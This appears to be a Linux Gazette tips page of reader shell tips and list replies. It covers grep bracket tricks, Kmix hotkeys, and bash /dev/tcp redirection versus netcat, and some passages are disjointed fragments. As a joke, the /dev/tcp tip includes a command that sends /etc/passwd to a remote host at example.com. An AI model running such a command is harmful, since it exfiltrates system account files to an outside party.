<P>
Are your games running slowly, even though you have the latest whizbang
video card? Is your Quake action more like a slow-motion low-crawl
through Jell-O than a high-FPS <strong>F</strong>(irst) <strong>P</strong>(erson) <strong>S</strong>(hooter)? You may be
using software emulation of direct rendering (DRI) instead of the real
thing, or may have outdated (or missing) GL libraries.
</P>
<P>
Here's a simple shell script that brings together all the necessary
tools for checking your system's DRI status. I strongly suggest
referring to the DRI Troubleshooting page at
<A HREF="http://dri.sourceforge.net/cgi-bin/moin.cgi/DriTroubleshooting"
	>http://dri.sourceforge.net/cgi-bin/moin.cgi/DriTroubleshooting</A> for a
good guide to fixing any problems you find; it's been of great help to
me several times.
</P>

Save it, make it executable with 'chmod +x &lt;name&gt;', run it, and follow
the prompts at the bottom of the screen. (And remember to keep moving as
you fire; the Macron in Level 8 can shoot missiles all day long.)

You can't do that without ncurses. That is, you can't do it in a
standard way that will work everywhere. You could spit out some escape
codes, but that only works with on type of terminal. This sort of
problem is exactly why the ncurses library exists, and to not use it
would be quite silly.

Interesting.  Not that I use it, but was intrigued when I noticed that HP

offering it gratis for non-commercial use - in closed source format IIRC.
They soon killed it though, no doubt after being pressured by Redmond.

Intermediate-level shell tip for the above situation:
</BLOCKQUOTE>

<blockquote><pre>ps aux|grep '[j]uk'
</pre></blockquote>
<BLOCKQUOTE>
Will ignore the 'grep' line every time. Why? Well...
</BLOCKQUOTE>

<blockquote><pre>ben@Fenrir:~$ find / [f]oo &gt; /dev/null 2&gt;&amp;1 &amp;
[1] 8099
ben@Fenrir:~$ ps --pid 8099
  PID TTY          TIME CMD
 8099 pts/0    00:00:02 find / [f]oo
</pre></blockquote>
<BLOCKQUOTE>
Note that 'ps' lists the command exactly as invoked - square brackets
and all. 'grep' itself, however, <EM>interprets</EM> the square brackets as a
character class: that is, it looks for a match for any character(s)
contained within the brackets. Since the only character within the
brackets is 'f',  '[f]oo' is interpreted simply as 'foo'. As a result,
'grep' is searching for 'foo' - but the 'grep' line itself, as listed by
'ps ax', does not contain 'foo'; it contains '[f]oo', which does not
match.
</BLOCKQUOTE>
<BLOCKQUOTE>
The concept is a bit difficult to understand the first time, obvious -
and handy! - forever after.

</BLOCKQUOTE>
<P><STRONG>
I'd forgotten this; handy.  Only works, of course, if the argument to
grep is a literal.  Well, more accurately, it's even harder to
understand (and possibly might break other things) if you put it in a
variable...

<P>
For years now I have been staring at the extra keys on my Logitech Freedom
Optical with despair in my heart.  I told myself I did not really need them,
but somehow I felt less than a windows drone because I paid the money for a
cordless keyboard and mouse and did not have full function.
</P>
<P>
Then I read this article, tried a few of the hotkeys for launching email, web
browser and local file browser.  That was all very neat but what i really
wanted was to use the dial on the keyboard for volume control.  My speakers
have buttons to push for volume control but they are clunky and response is
slow, using a slider on Kmix is equally unwieldy.  When the email
notification suddenly blares out (because I just finished watching a movie
and forgot to lower the sound) I want to turn the sound down before the last
tones fade out.
</P>
<P>
I muddled about in the <A HREF="http://www.kde.org/">KDE</A> control centre a bit with not much success then hit
on the astounding idea that maybe I could configure this from Kmix.  Right
click on the master volume control -&gt; define keys......a few short clicks
later and I had the dial working to raise and lower sound and the mute button
as well.  I felt f***n great.  Can you say eeeasssy, can you say in-tui-tive?
Wow, this is really the cats pajamas!
</P>
<P>
Sometimes the smallest things just make life worth living again ;~)

Flavio Poletti (<a href="mailto:tag@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%2310">anonymous</a>)


<!-- ::
Telnet's nice, netcat's better
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
plus, <TT>/dev/tcp</TT> bashing
:: -->
<P><STRONG>
Sending some network traffic from the shell.
</STRONG></P>
<P><STRONG>
Some time ago (actually, <EM>a long time ago</EM>) I needed to send some TCP
traffic towards a host on a regular basis. So... the only tool I knew was
telnet, I had no clue about socket programming, and I had to study expect
in order to get the job done. No need to say, it was a real pain - what
else should I <TT>/expect/?</TT> (For those who don't know what I'm talking about,
I suggest to perform more-than-trivial interaction with some server on
ports other than the telnet one).
</STRONG></P>
<P><STRONG>
Some time later, I learnt socket programming, so I was able to do the job
inside C and call my program from the shell. But you can bet on it - it
was some very focused application and proved to give me no help in a
similar-but-different context.
</STRONG></P>
<P><STRONG>
It was then that I discovered netcat.
</STRONG></P>
<P><STRONG>
netcat (actually the executable should be called nc) is what I needed,
plus much more. It is capable of running in both client and server
(listening) mode, to cope with both TCP and UDP, and provides the more
straightforward concept you could ask for: it reads standard input and
sends it to the remote destination, and gives you the incoming traffic on
the standard output. Quite nice, isn't it? netcat should be already
available in your Linux box, anyway you can download it here:
<A HREF="http://www.atstake.com/research/tools/network_utilities"
	>http://www.atstake.com/research/tools/network_utilities</A>
</STRONG></P>
<P><STRONG>
I was very proud of my discovery (only 5-6 years of research!) when
recently I had to find something that - quite surprising to me - was even
simpler. I mean, to solve my ancient two-nights-without-sleep problem I
didn't even need an external program! I found that what I needed can be
done entirely inside the shell, provided that you're using bash - and all
of us are using bash, aren't we?
</STRONG></P>
<P><STRONG>
This is the trick: bash defines some fake devices which you can use as
files for redirection - but you actually get some IP traffic with them! So
you can send your passwd file to your worst enemy at example.com simply by
issuing this command:
</STRONG></P>
<P><STRONG><CODE>
cat /etc/passwd &gt; /dev/tcp/example.com/10000
</CODE></STRONG></P>
<P><STRONG>
(we all know that our worst enemy accepts passwd files listening to port
10000)
</STRONG></P>
<P><STRONG>
That's it - and you can do that with UDP as well! If you want to find out
more, take a look at the Bash Advanced Scripting Guide, in particular
paragraph 28.1 (<A HREF="http://www.tldp.org/LDP/abs/html/devref1.html"
	>http://www.tldp.org/LDP/abs/html/devref1.html</A>).
</STRONG></P>
<P><STRONG>
This is my 2c Tip!
</STRONG></P>
<HR width="10%" align="center"><P><STRONG>
I tried to seek inside <TT>/dev</TT> to see if there is any tcp or udp device,
but found neither - that's why I claim that these devices are
bash-interpreted. If you know more about this... correct please!
</STRONG></P>

[Jason Creighton] 
Quoting from the bash manpage:
</BLOCKQUOTE>

<blockquote><pre>       Bash  handles  several  filenames  specially  when  they  are  used  in
       redirections, as described in the following table
</pre></blockquote>
<BLOCKQUOTE>
[Ben] ben@Fenrir:~$ ls -l <TT>/dev/tcp</TT><br>
ls: <TT>/dev/tcp:</TT> No such file or directory
</BLOCKQUOTE>
<BLOCKQUOTE>
The Talmud, I mean the "bash" man page, offers no further help; however,
the Commentaries... err, <TT>/usr/src/linux/Documentation/devices.txt</TT>, says
these are iBCS-2 compatability devices...
</BLOCKQUOTE>
<BLOCKQUOTE>
So, I made these nodes - with a little help from Perl:

<pre>
ben@Fenrir:/usr/src/linux/Documentation$ su
Password:
root@Fenrir:/usr/src/linux/Documentation# mkdir /dev/inet
root@Fenrir:/usr/src/linux/Documentation# perl -wne'
if(m#0 = /dev/socksys#../raw/){/(\d+) = ([^\s]+)/;
system"mknod -m 0664 $2 c 30 $1; chgrp dialout $2"}
' devices.txt
root@Fenrir:/usr/src/linux/Documentation# perl -wlne'
if (m#/dev/ip #../X0R/){/([^\s]+) -&gt; ([^\s]+)/;
system"ln -s $2 $1"}' devices.txt
</pre>

Group "dialout" allows its members to use those devices.
</BLOCKQUOTE>
<BLOCKQUOTE>
In the next invocation, I selected the second group from above and
created the symlinks by using much the same mechanism.
</BLOCKQUOTE>
<BLOCKQUOTE>
So, after all of that - will the stuff promised by the Bash man page
work?
</BLOCKQUOTE>

<blockquote><pre>ben@Fenrir:~$ su -c 'thttpd -d ~ben/www'
ben@Fenrir:~$ cat /dev/tcp/localhost/80
cat: /dev/tcp/localhost/80: Not a directory
ben@Fenrir:~$ nc /dev/tcp/localhost/80
/dev/tcp/localhost/80: forward host lookup failed: Unknown host
</pre></blockquote>
<BLOCKQUOTE>
[Kapil] 
I assume you are really <A HREF="http://www.debian.org/">Debian</A>ized. So quoting from
/usr/share/doc/bash/README.Debian.gz:
</BLOCKQUOTE>

<blockquote><pre>	9. Why is bash configured with --disable-net-redirections?

	    It can produce completely unexpected results. This kind of
	    feature should not be part of a shell but a special. tool. And
	    that tool has existed for years already, it's called netcat.
</pre></blockquote>

<blockquote><font color="#000066">And that brings us back around to Flavio's pleased discovery 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
 -- Heather</font></blockquote>
<BLOCKQUOTE>
[Jason] 
So, if you were going to use this silly little bash trick instead of
netcat, you would do something like this:
</BLOCKQUOTE>

<blockquote><pre>~$ cat /dev/tcp/localhost/25
cat: /dev/tcp/localhost/25: No such file or directory
~$ cat &lt; /dev/tcp/localhost/25
220 jpc.example.com ESMTP Exim 4.20 Fri, 16 Jul 2004 16:32:55 -0600
</pre></blockquote>
<BLOCKQUOTE>
I don't think it's possible to set up a bidirectional link via this
method, like you can with netcat. Or perhaps there's some Really Clever
Shell Tricks you can use to get cat's stdin and stdout hooked up to the
fd in order for you to, for example, interact with an SMTP server. But I
honestly don't care if you can do this, because it is, as you say...
easier and nicer not to do this sort of thing in the shell.
